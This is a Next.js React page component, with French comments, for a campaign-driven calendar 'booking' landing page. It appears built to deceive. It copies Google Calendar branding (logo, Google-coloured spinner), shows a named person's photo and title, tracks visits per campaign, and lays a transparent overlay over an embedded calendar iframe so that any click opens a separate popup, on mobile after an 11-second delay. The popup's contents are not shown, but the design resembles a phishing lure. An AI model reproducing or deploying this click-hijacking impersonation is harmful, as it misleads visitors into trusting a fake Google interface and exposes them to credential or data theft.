import React, { useState, useEffect } from 'react';
import { useRouter } from 'next/router';
import { PageHead } from '../../src/hooks/usePageMeta';
import { useCampaign } from '../../src/hooks/useCampaigns';
import { useVisitTracker } from '../../src/hooks/useVisitTracker';
import { usePopupManager, POPUP_TYPES } from '../../src/hooks/usePopupManager';
import PopupRenderer from '../../src/components/common/PopupRenderer';
import styles from '../../src/styles/modules/Index.module.css';

const CalendarLanding = () => {
  const [showAuthorCache, setShowAuthorCache] = useState(false);
  const [showOverlayFilter, setShowOverlayFilter] = useState(false);
  const router = useRouter();
  const { campaign: campaignId } = router.query;
  
  // Utiliser le hook personnalisé pour récupérer les données de campagne
  const { campaign: campaignData, loading, error } = useCampaign(campaignId);
  
  // Tracker les visites de campagne
  useVisitTracker(campaignId);

  // Gestionnaire de popup centralisé
  const popupManager = usePopupManager();

  useEffect(() => {
    if (error) {
      console.warn(`Erreur lors du chargement de la campagne: ${error}`);
    }
  }, [error]);

  // Afficher le cache de l'auteur après 2 secondes
  useEffect(() => {
    const timer = setTimeout(() => {
      setShowAuthorCache(true);
    }, 750);

    return () => clearTimeout(timer);
  }, []);

  // Afficher le filtre overlay après 11 secondes (seulement sur mobile)
  useEffect(() => {
    // Vérifier si on est sur mobile
    const isMobile = window.innerWidth <= 768;
    
    if (isMobile) {
      const timer = setTimeout(() => {
        setShowOverlayFilter(true);
      }, 11000);

      return () => clearTimeout(timer);
    } else {
      // Sur desktop, afficher le filtre immédiatement
      setShowOverlayFilter(true);
    }
  }, []);

  const handleScreenClick = (e) => {
    // Ne pas ouvrir la popup si on clique sur la popup elle-même
    const popupElement = e.target.closest('[data-popup]');
    if (popupElement) {
      return;
    }
    
    // Ouvrir la popup SEULEMENT si le filtre est visible
    if (showOverlayFilter) {
      popupManager.openBookingPopup({
        campaignData
      });
    }
  };

  const handlePopupClose = () => {
    popupManager.closePopup();
  };

  // Titre dynamique basé sur les données de campagne
  const getPageTitle = () => {
    if (loading) return 'Chargement...';
    if (campaignData) {
      return `Réservez avec ${campaignData.firstName} ${campaignData.lastName}`;
    }
    return 'Choisissez votre créneau';
  };

  // Description dynamique basée sur les données de campagne  
  const getPageDescription = () => {
    if (loading) return 'Chargement de votre calendrier de réservation...';
    if (campaignData) {
      return `Réservez facilement votre créneau avec ${campaignData.firstName} ${campaignData.lastName}. Calendrier interactif disponible.`;
    }
    return 'Sélectionnez facilement votre créneau de réservation dans notre calendrier interactif';
  };

  // Affichage en cas d'erreur
  if (error) {
    return (
      <>
        <PageHead 
          title="Erreur de chargement"
          description="Une erreur s'est produite lors du chargement de la campagne"
        />
        <div className={styles.container}>
          <div className={styles.errorMessage}>
            <h2>Erreur de chargement</h2>
            <p>La campagne demandée n'a pas pu être chargée.</p>
            <p>Veuillez vérifier le lien ou contacter l'administrateur.</p>
          </div>
        </div>
      </>
    );
  }

  return (
    <>
      <PageHead 
        title={getPageTitle()}
        description={getPageDescription()}
        options={{
          keywords: 'réservation, calendrier, créneau, rendez-vous',
          favicon: '/calendar-favicon.ico'
        }}
      />
      
      {/* Cache avec informations de l'auteur */}
      {campaignData && showAuthorCache && (
        <div className={styles.authorCache}>
          <img 
            src={campaignData.profileImage} 
            alt={`${campaignData.firstName} ${campaignData.lastName}`}
            className={styles.authorImage}
          />
          <div className={styles.authorInfo}>
            <div className={styles.authorName}>
              {campaignData.firstName} {campaignData.lastName}
            </div>
            <div className={styles.authorTitle}>
              {campaignData.title}
            </div>
          </div>
          {/* Logo Google Calendar visible seulement sur mobile */}
          <img 
            src="https://ssl.gstatic.com/calendar/images/dynamiclogo_2020q4/calendar_31_2x.png"
            alt="Google Calendar"
            className={styles.googleCalendarLogo}
          />
        </div>
      )}
      
      <div onClick={handleScreenClick} className={styles.container}>
        <div className={styles.iframeContainer}>
          <iframe 
            src={campaignData?.iframeUrl || null} 
            className={styles.iframe}
            frameBorder="0"
          />
          {/* Div transparente pour capturer les clics sur l'iframe */}
          <div 
            onClick={handleScreenClick}
            className={`${styles.clickOverlay} ${showOverlayFilter ? styles.visible : ''}`}
            title="Choisissez un créneau horaire"
          />
        </div>
        
        {/* Loader superposé pendant le chargement */}
        {loading && (
          <div className={styles.overlayLoader}>
            <div className={styles.googleLoader}>
              <div className={styles.googleSpinner}>
                <div className={styles.googleSpinnerBlue}></div>
                <div className={styles.googleSpinnerRed}></div>
                <div className={styles.googleSpinnerYellow}></div>
                <div className={styles.googleSpinnerGreen}></div>
              </div>
            </div>
            <p className={styles.loadingText}>Chargement du calendrier...</p>
          </div>
        )}
        
        {/* Système de popup centralisé */}
        <PopupRenderer
          isVisible={popupManager.isVisible}
          type={popupManager.type}
          data={popupManager.data}
          config={popupManager.config}
          onClose={handlePopupClose}
          onSwitch={popupManager.switchPopup}
        />
      </div>
    </>
  );
};

export default CalendarLanding; 